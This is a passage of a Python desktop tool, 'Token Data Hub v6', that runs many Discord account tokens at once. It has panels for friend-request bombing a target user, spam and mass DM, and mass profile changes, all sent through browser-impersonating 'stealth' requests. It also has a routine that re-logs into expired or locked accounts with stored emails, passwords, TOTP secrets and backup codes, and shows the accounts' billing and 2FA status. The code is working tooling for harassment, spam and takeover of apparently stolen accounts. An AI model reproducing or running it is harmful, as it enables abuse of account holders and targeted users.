            self._active_ws.clear()
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Friend Bomb Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class FriendBombPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "🤝 Friend Bomb", "Mass friend requests from all tokens", width=600, height=500)
        self._panel_key = 'friend_bomb'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row = ctk.CTkFrame(pad, fg_color="transparent"); row.pack(fill="x", padx=16, pady=10)
        ctk.CTkLabel(row, text="Target", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.target_entry = ctk.CTkEntry(row, placeholder_text="username", width=220, height=34,
                                          corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                          text_color=C['text'], font=ctk.CTkFont(family=FONT, size=13))
        self.target_entry.pack(side="left")
        ctk.CTkLabel(row, text=f"  {len(self.tokens)} tokens",
                     font=ctk.CTkFont(family=FONT, size=12, weight="bold"), text_color=C['accent']).pack(side="left", padx=12)

        self.add_stat('sent', 'Sent', C['green'])
        self.add_stat('failed', 'Failed', C['red'])

    def on_start(self):
        target = self.target_entry.get().strip()
        if not target:
            self.log("No target", 'red'); self.finish(); return
        threading.Thread(target=self._worker, args=(target,), daemon=True).start()

    def _worker(self, target):
        self.log(f"Friend bombing '{target}' · {len(self.active_tokens)} tokens", 'accent')
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            try:
                r = _stealth_post(t.token, f'{API}/users/@me/relationships', json_data={'username': target, 'discriminator': None}, timeout=10)
                if r.status_code in (200, 204):
                    self.inc_stat('sent'); self.log(f"  [{i+1}] ✓ {uname}", 'green')
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 5)
                    self.log(f"  [{i+1}] ⏳ {retry:.1f}s", 'yellow'); time.sleep(retry + 1)
                else:
                    self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {r.status_code}", 'red')
            except Exception as e:
                self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {e}", 'red')
            time.sleep(1.0)
        self.log(f"═══ Done · {self._stats['sent']} sent ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Status Changer Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class StatusChangerPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "✏️ Status", "Set custom status on all tokens", width=600, height=480)
        self._panel_key = 'status'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row1 = ctk.CTkFrame(pad, fg_color="transparent"); row1.pack(fill="x", padx=16, pady=(10, 4))
        ctk.CTkLabel(row1, text="Text", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.status_entry = ctk.CTkEntry(row1, placeholder_text="Custom status...", width=320, height=34,
                                          corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                          text_color=C['text'], font=ctk.CTkFont(family=FONT, size=13))
        self.status_entry.pack(side="left", fill="x", expand=True)

        row2 = ctk.CTkFrame(pad, fg_color="transparent"); row2.pack(fill="x", padx=16, pady=(2, 10))
        ctk.CTkLabel(row2, text="Status", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.online_var = ctk.StringVar(value="online")
        ctk.CTkOptionMenu(row2, values=["online", "idle", "dnd", "invisible"],
                          variable=self.online_var, width=120, height=34, corner_radius=8,
                          fg_color=C['surface_2'], button_color=C['accent'],
                          button_hover_color=C['accent_hover'],
                          font=ctk.CTkFont(family=FONT, size=12)).pack(side="left")
        ctk.CTkLabel(row2, text=f"  {len(self.tokens)} tokens",
                     font=ctk.CTkFont(family=FONT, size=12, weight="bold"), text_color=C['accent']).pack(side="left", padx=12)

        self.add_stat('done', 'Updated', C['green'])
        self.add_stat('failed', 'Failed', C['red'])

    def on_start(self):
        text = self.status_entry.get().strip()
        status = self.online_var.get()
        threading.Thread(target=self._worker, args=(text, status), daemon=True).start()

    def _worker(self, text, online_status):
        self.log(f"Setting '{text}' ({online_status}) on {len(self.active_tokens)} tokens", 'accent')
        payload = {'custom_status': {'text': text} if text else None}
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            try:
                r = _stealth_patch(t.token, f'{API}/users/@me/settings', json_data={'status': online_status, **payload}, timeout=10)
                if r.status_code == 200:
                    self.inc_stat('done'); self.log(f"  [{i+1}] ✓ {uname}", 'green')
                else:
                    self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {r.status_code}", 'red')
            except Exception as e:
                self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {e}", 'red')
            time.sleep(0.5)
        self.log(f"═══ Done · {self._stats['done']} updated ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Nickname Changer Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class NickChangerPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "📝 Nicknames", "Change nickname in a guild", width=600, height=480)
        self._panel_key = 'nick'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row1 = ctk.CTkFrame(pad, fg_color="transparent"); row1.pack(fill="x", padx=16, pady=(10, 4))
        ctk.CTkLabel(row1, text="Guild ID", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.guild_entry = ctk.CTkEntry(row1, placeholder_text=GUILD_ID, width=200, height=34,
                                         corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                         text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12))
        self.guild_entry.pack(side="left")
        ctk.CTkLabel(row1, text="  Nickname", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(16, 8))
        self.nick_entry = ctk.CTkEntry(row1, placeholder_text="New nickname...", width=200, height=34,
                                        corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                        text_color=C['text'], font=ctk.CTkFont(family=FONT, size=13))
        self.nick_entry.pack(side="left", fill="x", expand=True)

        self.add_stat('done', 'Changed', C['green'])
        self.add_stat('failed', 'Failed', C['red'])

    def on_start(self):
        g_id = self.guild_entry.get().strip() or GUILD_ID
        nick = self.nick_entry.get().strip()
        threading.Thread(target=self._worker, args=(g_id, nick), daemon=True).start()

    def _worker(self, guild_id, nick):
        self.log(f"Setting nick '{nick}' in {guild_id}", 'accent')
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            try:
                r = _stealth_patch(t.token, f'{API}/guilds/{guild_id}/members/@me', json_data={'nick': nick}, timeout=10)
                if r.status_code == 200:
                    self.inc_stat('done'); self.log(f"  [{i+1}] ✓ {uname}", 'green')
                else:
                    self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {r.status_code}", 'red')
            except Exception as e:
                self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {e}", 'red')
            time.sleep(0.5)
        self.log(f"═══ Done · {self._stats['done']} changed ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HypeSquad Changer Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class HypeSquadPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "🏠 HypeSquad", "Change HypeSquad house", width=550, height=460)
        self._panel_key = 'hypesquad'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row = ctk.CTkFrame(pad, fg_color="transparent"); row.pack(fill="x", padx=16, pady=10)
        ctk.CTkLabel(row, text="House", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.house_var = ctk.StringVar(value="Bravery")
        ctk.CTkOptionMenu(row, values=["Bravery", "Brilliance", "Balance"],
                          variable=self.house_var, width=140, height=34, corner_radius=8,
                          fg_color=C['surface_2'], button_color=C['accent'],
                          button_hover_color=C['accent_hover'],
                          font=ctk.CTkFont(family=FONT, size=12)).pack(side="left")
        ctk.CTkLabel(row, text=f"  {len(self.tokens)} tokens",
                     font=ctk.CTkFont(family=FONT, size=12, weight="bold"), text_color=C['accent']).pack(side="left", padx=12)

        self.add_stat('done', 'Changed', C['green'])
        self.add_stat('failed', 'Failed', C['red'])

    def on_start(self):
        house = {'Bravery': 1, 'Brilliance': 2, 'Balance': 3}[self.house_var.get()]
        threading.Thread(target=self._worker, args=(house,), daemon=True).start()

    def _worker(self, house_id):
        self.log(f"Setting HypeSquad house {house_id}", 'accent')
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            try:
                r = _stealth_post(t.token, f'{API}/hypesquad/online', json_data={'house_id': house_id}, timeout=10)
                if r.status_code in (200, 204):
                    self.inc_stat('done'); self.log(f"  [{i+1}] ✓ {uname}", 'green')
                else:
                    self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {r.status_code}", 'red')
            except Exception as e:
                self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {e}", 'red')
            time.sleep(0.5)
        self.log(f"═══ Done · {self._stats['done']} changed ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Leave Guild Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class LeaveGuildPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "🚪 Leave Guild", "Leave a server with all tokens", width=550, height=460)
        self._panel_key = 'leave_guild'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row = ctk.CTkFrame(pad, fg_color="transparent"); row.pack(fill="x", padx=16, pady=10)
        ctk.CTkLabel(row, text="Guild ID", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.guild_entry = ctk.CTkEntry(row, placeholder_text="Guild ID to leave", width=220, height=34,
                                         corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                         text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12))
        self.guild_entry.pack(side="left")
        ctk.CTkLabel(row, text=f"  {len(self.tokens)} tokens",
                     font=ctk.CTkFont(family=FONT, size=12, weight="bold"), text_color=C['accent']).pack(side="left", padx=12)

        self.add_stat('left', 'Left', C['green'])
        self.add_stat('failed', 'Failed', C['red'])

    def on_start(self):
        g_id = self.guild_entry.get().strip()
        if not g_id:
            self.log("No guild ID", 'red'); self.finish(); return
        threading.Thread(target=self._worker, args=(g_id,), daemon=True).start()

    def _worker(self, guild_id):
        self.log(f"Leaving guild {guild_id} · {len(self.active_tokens)} tokens", 'accent')
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            try:
                r = _stealth_delete(t.token, f'{API}/users/@me/guilds/{guild_id}', timeout=10)
                if r.status_code in (200, 204):
                    self.inc_stat('left'); self.log(f"  [{i+1}] ✓ {uname}", 'green')
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 5)
                    self.log(f"  [{i+1}] ⏳ {retry:.1f}s", 'yellow'); time.sleep(retry + 1)
                else:
                    self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {r.status_code}", 'red')
            except Exception as e:
                self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {e}", 'red')
            time.sleep(0.8)
        self.log(f"═══ Done · {self._stats['left']} left ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Bio Changer Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class BioChangerPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "📝 Change Bio", "Set bio on all tokens", width=580, height=460)
        self._panel_key = 'bio'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row = ctk.CTkFrame(pad, fg_color="transparent"); row.pack(fill="x", padx=16, pady=10)
        ctk.CTkLabel(row, text="Bio", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.bio_entry = ctk.CTkEntry(row, placeholder_text="New bio text...", width=380, height=34,
                                       corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                       text_color=C['text'], font=ctk.CTkFont(family=FONT, size=13))
        self.bio_entry.pack(side="left", fill="x", expand=True)

        self.add_stat('done', 'Updated', C['green'])
        self.add_stat('failed', 'Failed', C['red'])

    def on_start(self):
        bio = self.bio_entry.get().strip()
        threading.Thread(target=self._worker, args=(bio,), daemon=True).start()

    def _worker(self, bio):
        self.log(f"Setting bio on {len(self.active_tokens)} tokens", 'accent')
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            try:
                r = _stealth_patch(t.token, f'{API}/users/@me', json_data={'bio': bio}, timeout=10)
                if r.status_code == 200:
                    self.inc_stat('done'); self.log(f"  [{i+1}] ✓ {uname}", 'green')
                else:
                    self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {r.status_code}", 'red')
            except Exception as e:
                self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {e}", 'red')
            time.sleep(0.5)
        self.log(f"═══ Done · {self._stats['done']} updated ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Display Name Changer Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class DisplayNamePanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "🏷️ Display Names", "Change display name on all tokens", width=580, height=460)
        self._panel_key = 'display_name'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row = ctk.CTkFrame(pad, fg_color="transparent"); row.pack(fill="x", padx=16, pady=10)
        ctk.CTkLabel(row, text="Name", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.name_entry = ctk.CTkEntry(row, placeholder_text="New display name...", width=300, height=34,
                                        corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                        text_color=C['text'], font=ctk.CTkFont(family=FONT, size=13))
        self.name_entry.pack(side="left", fill="x", expand=True)

        self.add_stat('done', 'Changed', C['green'])
        self.add_stat('failed', 'Failed', C['red'])

    def on_start(self):
        name = self.name_entry.get().strip()
        if not name:
            self.log("No name entered", 'red'); self.finish(); return
        threading.Thread(target=self._worker, args=(name,), daemon=True).start()

    def _worker(self, name):
        self.log(f"Setting display name '{name}' on {len(self.active_tokens)} tokens", 'accent')
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            try:
                r = _stealth_patch(t.token, f'{API}/users/@me', json_data={'global_name': name}, timeout=10)
                if r.status_code == 200:
                    self.inc_stat('done'); self.log(f"  [{i+1}] ✓ {uname}", 'green')
                else:
                    self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {r.status_code}", 'red')
            except Exception as e:
                self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {e}", 'red')
            time.sleep(0.5)
        self.log(f"═══ Done · {self._stats['done']} changed ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Expired / Locked Token Recovery Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _reauth_token(t: 'TokenInfo'):
    """
    Try to get a fresh token for an account using stored credentials.
    Flow:
      1. POST /auth/login → email + password
      2. If MFA ticket → try TOTP code first, then each backup code
    Returns new token string on success, raises ValueError with reason on failure.
    """
    if not t.email or t.email in ('', 'N/A'):
        raise ValueError('No email stored')
    if not t.password or t.password in ('', '?'):
        raise ValueError('No password stored')

    s = creq.Session(impersonate='chrome')
    try:
        s.get('https://discord.com/login', headers={
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': UA,
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none', 'Upgrade-Insecure-Requests': '1',
        }, timeout=12)
    except:
        pass

    h = {
        'Content-Type': 'application/json',
        'User-Agent': UA,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/login',
        'X-Super-Properties': _sprops(),
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Sec-CH-UA': SEC_CH_UA, 'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
    }

    r1 = s.post(f'{API}/auth/login', headers=h, json={
        'login': t.email, 'password': t.password,
        'undelete': False, 'login_source': None, 'gift_code_sku_id': None,
    }, timeout=15)
    d1 = r1.json() if r1.status_code in (200, 400) else {}

    # Direct token (no MFA)
    if r1.status_code == 200 and d1.get('token'):
        return d1['token']

    # MFA required — grab ticket
    # Discord returns mfa as bool (True) or dict — ticket is always top-level
    mfa_obj = d1.get('mfa')
    ticket = d1.get('ticket') or (mfa_obj.get('ticket') if isinstance(mfa_obj, dict) else None)
    if not ticket:
        msg = d1.get('message') or d1.get('errors', {})
        raise ValueError(f'Login failed ({r1.status_code}): {msg}')

    # Try TOTP
    if t.totp_secret:
        code = pyotp.TOTP(t.totp_secret).now()
        r_t = s.post(f'{API}/auth/mfa/totp', headers=h, json={'code': code, 'ticket': ticket}, timeout=15)
        if r_t.status_code == 200 and r_t.json().get('token'):
            return r_t.json()['token']

    # Try backup codes (strip dashes/spaces, try each one)
    if t.backup_codes:
        raw_codes = t.backup_codes.replace(',', ' ').replace(';', ' ').split()
        for raw in raw_codes[:8]:
            code = raw.strip().replace('-', '')
            if not code:
                continue
            r_b = s.post(f'{API}/auth/mfa/backup', headers=h, json={'code': code, 'ticket': ticket}, timeout=15)
            if r_b.status_code == 200 and r_b.json().get('token'):
                return r_b.json()['token']

    raise ValueError('MFA required but TOTP and all backup codes failed')


class ExpiredTokensPanel(ActionPanel):
    """Re-authenticate expired/locked tokens using stored email + password + TOTP/backup codes."""
    def __init__(self, parent, tokens):
        super().__init__(parent, "🔄 Expired Tokens", "Re-authenticate expired tokens using stored credentials", width=720, height=520)
        self._panel_key = 'expired'
        self._hub = parent  # reference to DataHub for recovery
        # Use the hub's expired_tokens list (persisted in memory) + any still in `tokens` that are invalid
        combined = list(getattr(parent, 'expired_tokens', []))
        for t in tokens:
            if t.valid is False and not any(e.user_id == t.user_id and t.user_id for e in combined):
                combined.append(t)
        self.tokens = [t for t in combined if t.email and t.email not in ('', 'N/A')]

        pad = self.config_frame
        info_row = ctk.CTkFrame(pad, fg_color="transparent"); info_row.pack(fill="x", padx=16, pady=(12, 4))
        count_color = C['red'] if self.tokens else C['text_muted']
        ctk.CTkLabel(info_row, text=f"🔐 {len(self.tokens)} expired token(s) with stored credentials",
                     font=_F(FONT, 13, "bold"), text_color=count_color).pack(side="left")

        note_row = ctk.CTkFrame(pad, fg_color="transparent"); note_row.pack(fill="x", padx=16, pady=(0, 8))
        ctk.CTkLabel(note_row,
                     text="Uses email + password → TOTP code → backup codes to get a fresh token.",
                     font=_F(FONT, 11), text_color=C['text_muted']).pack(side="left")

        self.add_stat('recovered', 'Recovered', C['green'])
        self.add_stat('failed', 'Failed', C['red'])
        self.add_stat('skipped', 'Skipped (no creds)', C['text_dim'])

    def on_start(self):
        if not self.tokens:
            self.log("No expired tokens with stored credentials found.", 'red')
            self.finish(); return
        threading.Thread(target=self._worker, daemon=True).start()

    def _worker(self):
        self.log(f"🔄 Attempting re-auth for {len(self.tokens)} expired token(s)...", 'accent')
        for i, t in enumerate(self.tokens):
            if self.stopped:
                break
            uname = t.display_name or t.username or t.email or t.token[:12]
            if not t.email or t.email in ('', 'N/A') or not t.password or t.password in ('', '?'):
                self.log(f"  [{i+1}] ⚠ {uname} — no credentials stored", 'yellow')
                self.inc_stat('skipped'); continue

            self.log(f"  [{i+1}/{len(self.tokens)}] {uname} ({t.email})", 'cyan')
            totp_info = ' + TOTP' if t.totp_secret else ''
            backup_info = f' + {len(t.backup_codes.split())} backup codes' if t.backup_codes else ''
            self.log(f"    creds: pw=✓{totp_info}{backup_info}", 'text_dim')

            try:
                new_token = _reauth_token(t)
                # Update in memory
                old_token = t.token
                t.token   = new_token
                t.valid   = True
                # Clear old session cache
                with _session_lock:
                    _stealth_sessions.pop(old_token, None)
                # Move back to main token list & remove from expired
                hub = self._hub
                if hub:
                    with hub._lock:
                        existing_uids = {tk.user_id for tk in hub.tokens if tk.user_id}
                        if not t.user_id or t.user_id not in existing_uids:
                            hub.tokens.append(t)
                        hub.expired_tokens = [e for e in hub.expired_tokens if e.user_id != t.user_id]
                        save_tokens_to_file(hub.tokens)
                # Re-check to populate fresh data
                threading.Thread(target=t.check_validity, daemon=True).start()
                self.log(f"    ✅ Recovered! New token: {new_token[:24]}...", 'green')
                self.inc_stat('recovered')
                # Increment global recovered count
                if hub:
                    hub.recovered_count += 1
                    hub._safe_update_stats()
            except ValueError as e:
                self.log(f"    ✗ {e}", 'red')
                self.inc_stat('failed')
            except Exception as e:
                self.log(f"    ✗ Unexpected: {e}", 'red')
                self.inc_stat('failed')
            time.sleep(1.5)

        recovered = self._stats.get('recovered', 0)
        self.log(f"═══ Done · {recovered} recovered — press 💾 Save to write to file ═══", 'accent')
        # Refresh the main hub UI to show recovered tokens
        if recovered > 0 and self._hub:
            self._hub._safe_update_ui()
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Font cache — avoid creating hundreds of duplicate CTkFont objects
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_font_cache = {}


def _F(family=FONT, size=13, weight="normal"):
    key = (family, size, weight)
    if key not in _font_cache:
        _font_cache[key] = ctk.CTkFont(family=family, size=size, weight=weight)
    return _font_cache[key]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Main App — split updates, debounced rendering, font cache
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class DataHub(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Token Data Hub v6")
        self.geometry("1440x900")
        self.minsize(1100, 700)
        self.configure(fg_color=C['bg'])

        self.tokens: list[TokenInfo] = []
        self.expired_tokens: list[TokenInfo] = load_expired_tokens()  # Pre-load from token_data_old.txt
        self.recovered_count = 0  # Total tokens recovered this session
        self.auto_check_running = True
        self._poll_interval = 15
        self._avatar_refs = {}           # key -> CTkImage  (persistent, never cleared)
        self._all_seen_tokens = set()
        self._lock = threading.Lock()
        self._destroyed = False

        # Debounce state
        self._stats_pending = False
        self._cards_pending = False
        self._card_token_hash = None     # hash of displayed tokens for dirty-checking

        # Scan limiter — max 3 concurrent seed scanners
        self._scan_pool = ThreadPoolExecutor(max_workers=3)

        # Panel tracking — key -> panel instance (persistent)
        self._panels: dict[str, ActionPanel] = {}
        self._panel_buttons: dict[str, ctk.CTkButton] = {}

        self._build_ui()
        self._start_fetch()
        self._start_auto_poll()
        # Auto-recover pre-loaded expired tokens in background
        if self.expired_tokens:
            print(f'[startup] {len(self.expired_tokens)} expired tokens loaded — starting auto-recovery...')
            threading.Thread(target=self._startup_recover, daemon=True).start()

    # ━━━ Layout ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _build_ui(self):
        # ── Header ──
        header = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0, height=60)
        header.pack(fill="x"); header.pack_propagate(False)

        title_frame = ctk.CTkFrame(header, fg_color="transparent")
        title_frame.pack(side="left", padx=24, pady=8)
        ctk.CTkLabel(title_frame, text="⚡", font=_F(size=22),
                     text_color=C['accent']).pack(side="left", padx=(0, 10))
        tt = ctk.CTkFrame(title_frame, fg_color="transparent"); tt.pack(side="left")
        ctk.CTkLabel(tt, text="Token Data Hub", font=_F(FONT, 20, "bold"),
                     text_color=C['text']).pack(anchor="w")
        ctk.CTkLabel(tt, text="v6 · Live Dashboard", font=_F(FONT, 10),
                     text_color=C['text_muted']).pack(anchor="w")

        # Right controls
        right = ctk.CTkFrame(header, fg_color="transparent"); right.pack(side="right", padx=24)
        self.sort_var = ctk.StringVar(value="Newest First")
        ctk.CTkOptionMenu(right,
                          values=["⭐ Important", "Newest First", "Oldest First", "Nitro First",
                                  "Has Billing", "Has Badges", "Most Guilds", "Most Friends"],
                          variable=self.sort_var, command=self._on_sort_change,
                          width=150, height=32, corner_radius=8,
                          fg_color=C['surface_2'], button_color=C['accent'],
                          button_hover_color=C['accent_hover'],
                          font=_F(FONT, 12)).pack(side="left", padx=(0, 10))
        self.btn_refresh = ctk.CTkButton(right, text="⟳  Refresh", width=100, height=32, corner_radius=8,
                                          fg_color=C['accent'], hover_color=C['accent_hover'],
                                          font=_F(FONT, 12, "bold"), command=self._start_fetch)
        self.btn_refresh.pack(side="left")

        # ── Stats Bar ──
        stats_bar = ctk.CTkFrame(self, fg_color=C['bg_alt'], corner_radius=0, height=72)
        stats_bar.pack(fill="x"); stats_bar.pack_propagate(False)
        si = ctk.CTkFrame(stats_bar, fg_color="transparent"); si.pack(expand=True, pady=6)

        self.stat_total   = self._make_stat(si, "0", "TOTAL",       C['accent'])
        self._stat_sep(si)
        self.stat_valid   = self._make_stat(si, "0", "VALID",       C['green'])
        self._stat_sep(si)
        self.stat_nitro   = self._make_stat(si, "0", "NITRO",       C['nitro'])
        self._stat_sep(si)
        self.stat_billing = self._make_stat(si, "0", "BILLING",     C['orange'])
        self._stat_sep(si)
        self.stat_mfa     = self._make_stat(si, "0", "2FA",         C['yellow'])
        self._stat_sep(si)
        self.stat_phone   = self._make_stat(si, "0", "PHONE",       C['cyan'])
        self._stat_sep(si)
        self.stat_badges  = self._make_stat(si, "0", "BADGES",      C['pink'])
        self._stat_sep(si)
        self.stat_friends = self._make_stat(si, "0", "AVG FRIENDS", C['text_dim'])
        self._stat_sep(si)
        self.stat_expired  = self._make_stat(si, "0", "EXPIRED",   C['red'])
        self._stat_sep(si)
        self.stat_recovered = self._make_stat(si, "0", "RECOVERED", C['green'])
        self._stat_sep(si)
        self.stat_check   = self._make_stat(si, "...", "STATUS",    C['yellow'])

        # ── Token List ──
        self.scroll = ctk.CTkScrollableFrame(self, fg_color=C['bg'], corner_radius=0,
                                              scrollbar_button_color=C['surface_2'],
                                              scrollbar_button_hover_color=C['accent'])
        self.scroll.pack(fill="both", expand=True, padx=16, pady=(8, 4))

        # ── Action Bar ──
        bottom = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0, height=96)
        bottom.pack(fill="x"); bottom.pack_propagate(False)

        row1 = ctk.CTkFrame(bottom, fg_color="transparent"); row1.pack(fill="x", padx=16, pady=(6, 1))
        row2 = ctk.CTkFrame(bottom, fg_color="transparent"); row2.pack(fill="x", padx=16, pady=(1, 6))

        bs = {'height': 32, 'corner_radius': 8, 'font': _F(FONT, 11, "bold")}
        ac = {'fg_color': C['accent'], 'hover_color': C['accent_hover']}
        sc = {'fg_color': C['surface_2'], 'hover_color': C['card_hover']}

        # Row 1 — primary actions
        self._panel_buttons['mass_dm'] = ctk.CTkButton(row1, text="💬 Mass DM", width=105, command=lambda: self._toggle_panel('mass_dm'), **ac, **bs)
        self._panel_buttons['mass_dm'].pack(side="left", padx=(0, 3))
        self._panel_buttons['channel_spam'] = ctk.CTkButton(row1, text="📢 Spam", width=85, command=lambda: self._toggle_panel('channel_spam'), **ac, **bs)
        self._panel_buttons['channel_spam'].pack(side="left", padx=3)
        self._panel_buttons['join_guild'] = ctk.CTkButton(row1, text="🏠 Join", width=75, command=lambda: self._toggle_panel('join_guild'), **sc, **bs)
        self._panel_buttons['join_guild'].pack(side="left", padx=3)
        self._panel_buttons['voice'] = ctk.CTkButton(row1, text="🎙 Voice", width=80, command=lambda: self._toggle_panel('voice'), **sc, **bs)
        self._panel_buttons['voice'].pack(side="left", padx=3)
        self._panel_buttons['friend_bomb'] = ctk.CTkButton(row1, text="🤝 Friend", width=80, command=lambda: self._toggle_panel('friend_bomb'), **sc, **bs)
